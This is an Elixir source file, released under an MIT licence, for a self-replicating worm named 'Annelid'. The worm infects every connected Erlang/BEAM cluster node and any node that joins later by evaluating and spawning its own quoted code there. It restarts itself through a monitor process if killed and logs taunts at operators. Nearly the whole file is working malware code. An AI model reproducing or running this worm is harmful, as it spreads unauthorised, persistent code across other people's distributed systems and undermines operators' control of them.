# --- MIT LICENSE ---
#
# Copyright 2019 Michael Shapiro
#
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation
# files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy,
# modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the
# Software is furnished to do so, subject to the following conditions:
#
#  The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
#
#  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES
#  OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE
#  LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR
#  IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
#
# -------------------

secret = "abcdefg"
taunt_every = 2_000
acquire_lock_every = 100

infector_ast =
  quote do
    fn ast ->
      require Logger

      annelid_starter =
        fn node ->
          if node != node() do
            Logger.warn "🐛 Attempting to infect #{node}!"
          end

          Node.spawn(node, fn ->
            {infector, _} = ast |> Code.eval_quoted()

            ast
            |> infector.()
            |> spawn()
          end)
        end

      supervisor =
        fn ->
          annelid_pid = self()

          {pid, _ref} = spawn_monitor(fn ->
            Process.monitor(annelid_pid)

            (fn recursor ->
              recursor.(recursor)
            end).(fn loop ->
              receive do
                {:DOWN, _ref, _type, ^annelid_pid, _reason} ->
                  annelid_starter.(node())

                _ ->
                  loop.(loop)
              end
            end)
          end)

          pid
        end

      transaction =
        fn trans ->
          lock =
            :crypto.hash(:sha,
              DateTime.utc_now()
              |> DateTime.to_unix()
              |> Integer.to_string()
              |> Kernel.<>(unquote(secret))
            )

          :global.trans({lock, self()}, trans, [node()], 0)
        end

      random_bytes =
        fn ->
          0..20
          |> Enum.random()
          |> :crypto.strong_rand_bytes()
        end

      fn ->
        # if we can't acquire the lock, another copy is running, die.
        transaction.(fn ->
          Process.group_leader(self(), Process.whereis(:init))

          Logger.warn "🐛 Annelid started!"

          Node.list() |> Enum.each(&annelid_starter.(&1))

          :ok = :net_kernel.monitor_nodes(true)

          acquire_lock_msg = random_bytes.()
          taunt_msg = random_bytes.()
          send(self(), acquire_lock_msg)
          send(self(), taunt_msg)

          (fn recursor ->
            recursor.(recursor, supervisor.())
          end).(fn loop, supervisor_pid ->
            receive do
              {:nodeup, node} ->
                annelid_starter.(node)
                loop.(loop, supervisor_pid)

              {:DOWN, _ref, _type, ^supervisor_pid, _reason} ->
                loop.(loop, supervisor.())

              ^acquire_lock_msg ->
                # if we can't acquire the lock, another copy is running, die.
                transaction.(fn ->
                  :timer.send_after(unquote(acquire_lock_every), acquire_lock_msg)
                  loop.(loop, supervisor_pid)
                end)

              ^taunt_msg ->
                Logger.info "🐛 Send a flu shot! (annelid: #{inspect self()}, supervisor: #{inspect supervisor_pid})"
                :timer.send_after(unquote(taunt_every), taunt_msg)
                loop.(loop, supervisor_pid)

              _ ->
                Logger.info "🐛 Type 'cookie', you idiot!"
                loop.(loop, supervisor_pid)
            end
          end)
        end)
      end
    end
  end

{infector, _} = infector_ast |> Code.eval_quoted()

infector_ast
|> infector.()
|> spawn()
